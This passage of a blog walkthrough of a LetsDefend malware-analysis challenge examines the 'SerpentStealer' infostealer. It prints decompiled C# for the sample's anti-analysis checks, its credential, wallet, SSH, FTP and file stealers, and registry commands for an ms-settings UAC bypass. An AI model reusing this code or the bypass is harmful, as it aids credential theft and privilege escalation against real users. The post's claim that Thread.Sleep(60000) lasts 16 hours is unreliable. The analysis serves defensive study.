</span></span><span class="line"><span class="cl">		<span class="kd">public</span> <span class="kd">static</span> <span class="k">readonly</span> <span class="kt">string</span> <span class="n">psCMD3</span> <span class="p">=</span> <span class="s">&#34;Set-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Name (default) -Value \&#34;{0}\&#34; -Force&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The Modules namespace has several stealer functions:</p>
<p><img src="/post/lets-defend-serpent-stealer/images/dnspy2.png"
	width="241"
	height="306"
	srcset="/post/lets-defend-serpent-stealer/images/dnspy2_hu_d26c49e4c23da2f3.png 480w, /post/lets-defend-serpent-stealer/images/dnspy2_hu_4db65ce1749cf066.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="78"
		data-flex-basis="189px"
	
></p>
<p>Finally SerpentStealer, we can see is acting as a main function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">SerpentStealer</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Token: 0x0200000B RID: 11</span>
</span></span><span class="line"><span class="cl">	<span class="kd">internal</span> <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x0600000F RID: 15 RVA: 0x00002DB8 File Offset: 0x00000FB8</span>
</span></span><span class="line"><span class="cl"><span class="na">		[NullableContext(1)]</span>
</span></span><span class="line"><span class="cl">		<span class="kd">private</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">A_0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">AntiVT</span><span class="p">.</span><span class="n">IsVirusTotal</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="n">Thread</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(</span><span class="m">60000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="n">Environment</span><span class="p">.</span><span class="n">Exit</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">AntiAv</span><span class="p">.</span><span class="n">IsAvPresent</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="n">Thread</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(</span><span class="m">60000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="n">Environment</span><span class="p">.</span><span class="n">Exit</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="n">Embed</span> <span class="n">embed</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Embed</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">PasswordStealer</span> <span class="n">passwordStealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PasswordStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">HistoryStealer</span> <span class="n">historyStealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">HistoryStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">AutofillStealer</span> <span class="n">autofillStealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">AutofillStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">Wallets</span> <span class="n">wallets</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Wallets</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">BookmarkStealer</span> <span class="n">bookmarkStealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BookmarkStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">SteamClient</span> <span class="n">steamClient</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SteamClient</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">SSHStealer</span> <span class="n">sshstealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SSHStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">FTPStealer</span> <span class="n">ftpstealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FTPStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">FileStealer</span> <span class="n">fileStealer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStealer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">autofillStealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">historyStealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">embed</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">passwordStealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">wallets</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">bookmarkStealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">steamClient</span><span class="p">.</span><span class="n">GetSteam</span><span class="p">(</span><span class="s">&#34;C:\\Users\\Aperx\\Desktop&#34;</span><span class="p">).</span><span class="n">Wait</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">sshstealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">ftpstealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">fileStealer</span><span class="p">.</span><span class="n">Run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="n">UAC</span><span class="p">.</span><span class="n">Bypass</span><span class="p">(</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Program finished.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If AntiVT or AntiAv trigger, the program sleeps for 1000 minutes (over 16 hours) then exits. Otherwise it runs through each of the stealers and finishes with establishing persistence via the UAC bypass.</p>
<h2 id="answers">Answers
</h2><h3 id="1-what-is-the-md5-hash-for-the-malware">1. What is the md5 hash for the malware?
</h3><p>We can use <code>md5sum</code> in Linux to find the answer quickly and easily:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ md5sum sample   
</span></span><span class="line"><span class="cl">a83230ddced4ae435220d8756cc07be9 sample
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="2-what-is-the-name-of-the-list-the-malware-uses-to-evade-detection-by-the-virustotal-check">2. What is the name of the list the malware uses to evade detection by the VirusTotal check?
</h3><p>This is found in AntiVT, the readonly string <code>VtPCNames</code></p>
<h3 id="3-what-is-the-name-of-the-folder-that-was-used-by-the-malware-to-collect-the-password-on-it">3. What is the name of the folder that was used by the malware to collect the password on it?
</h3><p>Within the <code>PasswordStealer</code> module:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">tempPath</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="n">GetTempPath</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">File</span><span class="p">.</span><span class="n">WriteAllText</span><span class="p">(</span><span class="n">tempPath</span> <span class="p">+</span> <span class="s">&#34;/serpent/Passwords.txt&#34;</span><span class="p">,</span> <span class="n">text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">text3</span> <span class="p">=</span> <span class="n">tempPath</span> <span class="p">+</span> <span class="s">&#34;/serpent/Passwords.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">List</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;();</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="p">(</span><span class="n">StreamReader</span> <span class="n">streamReader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">text3</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">),</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">string</span> <span class="n">text4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">((</span><span class="n">text4</span> <span class="p">=</span> <span class="n">streamReader</span><span class="p">.</span><span class="n">ReadLine</span><span class="p">())</span> <span class="p">!=</span> <span class="kc">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">list</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">text4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see the folder named <code>serpent</code>, storing the passwords to <code>Passwords.txt</code></p>
<h3 id="4-what-is-the-first-command-that-the-malware-uses-to-bypass-the-user-account-control-uac">4. What is the first command that the malware uses to bypass the User Account Control (UAC)?
</h3><p>This is looking for the string psCMD1:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-Item HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Force
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="5-how-many-file-extensions-does-the-malware-target">5. How many file extensions does the malware target?
</h3><p>This is likely referring to the <code>FileStealer</code>, which has an array of SupportedExtensions:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">string</span><span class="p">[]</span> <span class="n">SupportedExtensions</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">string</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;txt&#34;</span><span class="p">,</span> <span class="s">&#34;html&#34;</span><span class="p">,</span> <span class="s">&#34;php&#34;</span><span class="p">,</span> <span class="s">&#34;cs&#34;</span><span class="p">,</span> <span class="s">&#34;py&#34;</span><span class="p">,</span> <span class="s">&#34;json&#34;</span><span class="p">,</span> <span class="s">&#34;c&#34;</span><span class="p">,</span> <span class="s">&#34;cpp&#34;</span><span class="p">,</span> <span class="s">&#34;bat&#34;</span><span class="p">,</span> <span class="s">&#34;cmd&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;css&#34;</span><span class="p">,</span> <span class="s">&#34;js&#34;</span><span class="p">,</span> <span class="s">&#34;odt&#34;</span><span class="p">,</span> <span class="s">&#34;mp3&#34;</span><span class="p">,</span> <span class="s">&#34;png&#34;</span><span class="p">,</span> <span class="s">&#34;mp4&#34;</span><span class="p">,</span> <span class="s">&#34;gif&#34;</span><span class="p">,</span> <span class="s">&#34;wav&#34;</span><span class="p">,</span> <span class="s">&#34;jpg&#34;</span><span class="p">,</span> <span class="s">&#34;jpeg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;nim&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In total there are 21 extensions.</p>
<h3 id="6-what-is-the-first-process-listed-in-the-blacklisted-processes-used-by-the-malware">6. What is the first process listed in the blacklisted processes used by the malware?
</h3><p>Back in <code>AntiAv</code>, the list begins with the software <code>ProcessHacker.exe</code>.</p>
<h3 id="7-what-is-the-last-wallet-name-that-is-targeted-by-the-malware-on-the-list">7. What is the last wallet name that is targeted by the malware on the list?
</h3><p>In <code>Wallets</code>, there is a list of targeted wallet things:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="kt">string</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">string</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;zcash&#34;</span><span class="p">,</span> <span class="s">&#34;armory&#34;</span><span class="p">,</span> <span class="s">&#34;bytecoin&#34;</span><span class="p">,</span> <span class="s">&#34;liberty&#34;</span><span class="p">,</span> <span class="s">&#34;exodus&#34;</span><span class="p">,</span> <span class="s">&#34;keystore&#34;</span><span class="p">,</span> <span class="s">&#34;electrum&#34;</span><span class="p">,</span> <span class="s">&#34;atomic&#34;</span><span class="p">,</span> <span class="s">&#34;guarda&#34;</span><span class="p">,</span> <span class="s">&#34;coinomi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;feather&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>feather</code> is the final entry on this list.</p>
<h3 id="8-after-getting-the-current-user-what-is-the-subkey-used-by-the-malware-to-dump-ftp-credentials">8. After getting the current user, what is the subkey used by the malware to dump FTP credentials?
</h3><p>Interestingly the <code>FTPStealer</code> section was outside the usual <code>Modules</code> location:</p>
<p><img src="/post/lets-defend-serpent-stealer/images/dnspy3.png"
	width="233"
	height="448"
	srcset="/post/lets-defend-serpent-stealer/images/dnspy3_hu_81f88af4c703818b.png 480w, /post/lets-defend-serpent-stealer/images/dnspy3_hu_a9ab4fe0135acd5c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="52"
		data-flex-basis="124px"
	
></p>
<p>Alas we can see the following registry key location:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="s">&#34;Software\\Microsoft\\FTP&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="s">&#34;Credentials&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="impact">Impact
</h2><p>The malware itself is very well described on its own. After checking for common VirusTotal usernames in <code>AntiVT</code> and common analysis programs in <code>AntiAv</code> if none are detected it proceeds in running all of the stealer functions. With a final goodbye, UAC bypass is used to modify registry keys. It is interesting to note that although this malware acts to collect private information from various sources, it does not have the ability to send the data anywhere (no exfiltration capabilities).</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/malware/">Malware</a>
        
            <a href="/tags/infostealer/">Infostealer</a>
        
            <a href="/tags/dotnet/">Dotnet</a>
        
            <a href="/tags/dnspy/">DnSpy</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/post/lets-defend-linux-downloader/">
        
        
            <div class="article-image">
                <img src="/post/lets-defend-linux-downloader/ldef.354362bd6bf13ea7cd98513b567f22d3_hu_1ec28f535ff234fe.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Let&#39;s Defend: Linux Downloader"
                        
                        data-hash="md5-NUNivWvxPqfNmFE7Vn8i0w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Let&#39;s Defend: Linux Downloader</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/post/lets-defend-obfuscated-hta/">
        
        
            <div class="article-image">
                <img src="/post/lets-defend-obfuscated-hta/ldef.354362bd6bf13ea7cd98513b567f22d3_hu_1ec28f535ff234fe.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Let&#39;s Defend: Obfuscated HTA"
                        
                        data-hash="md5-NUNivWvxPqfNmFE7Vn8i0w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Let&#39;s Defend: Obfuscated HTA</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2023 - 
        
        2025 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
